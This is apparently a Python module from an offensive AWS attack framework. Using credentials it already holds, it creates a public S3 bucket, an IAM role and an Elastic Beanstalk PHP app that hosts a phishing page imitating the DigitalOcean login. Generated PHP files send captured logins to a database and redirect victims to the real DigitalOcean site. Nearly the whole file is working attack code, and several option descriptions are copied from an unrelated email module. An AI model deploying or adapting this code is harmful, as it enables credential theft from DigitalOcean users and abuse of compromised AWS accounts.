import json
import os
import random
import string
import sys
import shutil
import time

import boto3
import zipfile

import requests

from core.createSession.giveMeClient import giveMeClient

'''
    If you want to be recognized about your contribution, you can add your name/nickname and contacts here. It will be outputed when user types "options".
'''
author = {
    "name": "",
    "twitter": "",
    "github": "",
    "email": ""
}

needs_creds = True

variables = {
    "SERVICE": {
        "value": "elasticbeanstalk",
        "required": "true",
        "description": "The service that will be used to run the module. It cannot be changed."
    },
    "DBSERVER": {
        "value": "dbuser",
        "required": "true",
        "description": "The email address that is sending the email. This email address must be either individually verified with Amazon SES, or from a domain that has been verified with Amazon SES."
    },
    "DBUSER": {
        "value": "dbuser",
        "required": "true",
        "description": "The email address that is sending the email. This email address must be either individually verified with Amazon SES, or from a domain that has been verified with Amazon SES."
    },
    "DBPASS": {
        "value": "dbpass",
        "required": "true",
        "description": "The subject of the message."
    },
    "DO-OAUTH-URL": {
        "value": "",
        "required": "false",
        "description": "The path of a file containing target emails to send the malicious message to."
    },
    "CODE-BUCKET": {
        "value": "",
        "required": "false",
        "description": "The path of a file containing target emails to send the malicious message to."
    },
    "PROJECT-NAME": {
        "value": "DOPhishing",
        "required": "true",
        "description": "The name of ElasticBeanstalk project. By default DOPhishing"
    },
    "PROJECT-ROLE": {
        "value": "EBSRole",
        "required": "true",
        "description": "The name of ElasticBeanstalk project. By default DOPhishing"
    }
}
description = "Description of your Module"

aws_command = "aws elasticbeanstack describe-launch-templates --region {} --profile {}"


def exploit(all_sessions, cred_prof, useragent, web_proxies, workspace):
    profile = giveMeClient(
        all_sessions=all_sessions,
        cred_prof=cred_prof,
        useragent=useragent,
        web_proxies=web_proxies,
        service="elasticbeanstalk"
    )

    s3Profile = giveMeClient(
        all_sessions=all_sessions,
        cred_prof=cred_prof,
        useragent=useragent,
        web_proxies=web_proxies,
        service="s3"
    )

    iamProfile = giveMeClient(
        all_sessions=all_sessions,
        cred_prof=cred_prof,
        useragent=useragent,
        web_proxies=web_proxies,
        service="iam"
    )

    dbuser = variables['DBUSER']['value']
    dbserver = variables['DBSERVER']['value']
    dbpass = variables['DBPASS']['value']
    dourl = variables['DO-OAUTH-URL']['value']
    codebucket = variables['CODE-BUCKET']['value']
    projectname = variables['PROJECT-NAME']['value']
    projectrole = variables['PROJECT-ROLE']['value']

    generatePHPFiles(dbserver, dbuser, dbpass, dourl)
    status = createElasticBeanStalkApp(profile, codebucket, s3Profile, projectname, iamProfile, projectrole)

    return status


def createElasticBeanStalkApp(profile, codebucket, s3Profile, projectname, iamProfile, projectrole):
    try:
        if codebucket == "":
            codebucket = "dophishing-".join(random.choice(string.digits + string.ascii_lowercase) for _ in range(10))
            s3Profile.create_bucket(Bucket=codebucket)
        elif requests.get(f"https://{codebucket}.s3.amazonaws.com").status_code == 404:
            s3Profile.create_bucket(Bucket=codebucket)

        time.sleep(5)
        bucket_policy = {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "PublicReadGetObject",
                    "Effect": "Allow",
                    "Principal": "*",
                    "Action": "s3:GetObject",
                    "Resource": f"arn:aws:s3:::{codebucket}/code.zip"
                }
            ]
        }
        try:
            rolepolicy = json.dumps(
                {
                    "Version": "2012-10-17",
                    "Statement": [
                        {
                            "Sid": "",
                            "Effect": "Allow",
                            "Principal": {
                                "Service": [
                                    "elasticbeanstalk.amazonaws.com"
                                ]
                            },
                            "Action": [
                                "sts:AssumeRole"
                            ],
                            "Condition": {
                                "StringEquals": {
                                    "sts:ExternalId": "elasticbeanstalk"
                                }
                            }
                        }
                    ]
                }
            )

            rolearn = iamProfile.create_role(
                RoleName=projectrole,
                AssumeRolePolicyDocument=rolepolicy
            )["Role"]["Arn"]

            iamProfile.attach_role_policy(
                RoleName=projectrole,
                PolicyArn="arn:aws:iam::aws:policy/service-role/AWSElasticBeanstalkEnhancedHealth"
            )

            iamProfile.attach_role_policy(
                RoleName=projectrole,
                PolicyArn="arn:aws:iam::aws:policy/service-role/AWSElasticBeanstalkService"
            )
        except iamProfile.exceptions.EntityAlreadyExistsException:
            rolearn = iamProfile.get_role(
                RoleName=projectrole
            )["Role"]["Arn"]

        # Convert the policy to a JSON string
        bucket_policy = json.dumps(bucket_policy)

        # Set the new policy on the bucket
        s3Profile.delete_public_access_block(
            Bucket=codebucket
        )

        s3Profile.put_bucket_policy(
            Bucket=codebucket,
            Policy=bucket_policy
        )

        shutil.make_archive('core/module/initialaccess/__do_phishing_output/code', 'zip',
                            'core/module/initialaccess/__do_phishing')

        # s3Profile.upload_file('core/module/initialaccess/__do_phishing_output/code.zip', codebucket, 'code.zip')
        with open('core/module/initialaccess/__do_phishing_output/code.zip', 'rb') as body:
            s3Profile.put_object(
                # ACL='public-read',
                Body=body,
                Bucket=codebucket,
                Key='code.zip'
            )

        s3_source = {
            'S3Bucket': codebucket,
            'S3Key': 'code.zip'
        }

        profile.create_application(
            ApplicationName=projectname
        )

        profile.create_application_version(
            ApplicationName=projectname,
            VersionLabel='v1',
            SourceBundle=s3_source
        )

        profile.create_environment(
            ApplicationName=projectname,
            EnvironmentName=projectname,
            SolutionStackName='64bit Amazon Linux 2023 v4.3.0 running PHP 8.3',
            VersionLabel='v1',
            OperationsRole=rolearn
        )

        status = profile.describe_environments(
            EnvironmentNames=[projectname]
        )["Environments"][0]["Status"]

        time.sleep(10)

        eventResponse = profile.describe_events(
            EnvironmentName=projectname
        )["Events"]

        events = []
        for event in eventResponse:
            events.append(f"{event['EventDate']}: {event['Message']}")
        # profile.associate_environment_operations_role(
        #	EnvironmentName=projectname,
        #	OperationsRole=rolearn
        # )

        return {"AppName": projectname, "Status": status, "Events": events}
    except Exception as e:
        return {"error": f"Error Creating ElasticBeanStalk App: {str(e)}"}


def generatePHPFiles(dbserver, dbuser, dbpass, dourl):
    credfile = f"""
    <?php
        $dbservername = "{dbserver}";
        $dbusername = "{dbuser}";
        $dbpassword = "{dbpass}";
        $dbname = "Login";
    ?>
        """

    with open("core/module/initialaccess/__do_phishing/credentials.php", "w") as phpconfigfile:
        phpconfigfile.write(credfile)
        phpconfigfile.close()

    nexttogo = """
    <?php
    """

    if dourl != "":
        nexttogo += """
        $dourl = {dourl};
        ob_start();
        header('Location: '.$dourl);
        ob_end_flush();
        //die();
        """

    nexttogo += """
        $url = "https://cloud.digitalocean.com/";

        ob_start();
        header('Location: '.$url);
        ob_end_flush();
        //die();
    ?>
        """

    with open("core/module/initialaccess/__do_phishing/nexttogo.php", "w") as nexttogofile:
        nexttogofile.write(nexttogo)
        nexttogofile.close()
